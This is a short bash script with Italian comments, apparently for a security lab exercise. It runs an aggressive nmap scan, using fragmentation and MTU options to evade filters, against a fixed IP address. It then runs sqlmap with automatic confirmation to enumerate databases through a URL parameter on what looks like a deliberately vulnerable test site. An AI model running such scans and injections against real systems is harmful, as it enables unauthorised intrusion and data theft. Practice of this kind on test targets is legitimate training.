#!/bin/bash
#NMAP scan intenso:
#Accanto alle porte aperte c'è il ttl 
#subito sotto ciò che riguarda il cert
#La voce Running(JUST GUESSING) fa le ipotesi sul SO
#Tutto quello che riguarda TCP/IP è nella sezione fingerprint
#non credo serva ma sotto c'è il traceroute dettagliato

#NB: se ci accorgiamo che blocca il ping ci basterà aggiungere -Pn e togliere -A (versione aggressive)
#creo il file su cui salverò tutti i risultati,
touch test.txt
nmap -A -f -vv --mtu 1400 --version-intensity 3 -oN test.txt 176.28.50.165
python3 scraper.py
#SQLMAP: (ho cercato di fare le cose per gradi, se qualche passaggio vi sembra inutile saltatelo) comunque se ci danno internet vi consiglio $
yes |sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs > sqlmap.txt 
python -c'import sqlmap;sqlmap.trovadb()'
python -c'import sqlmap;sqlmap.nomedb()'



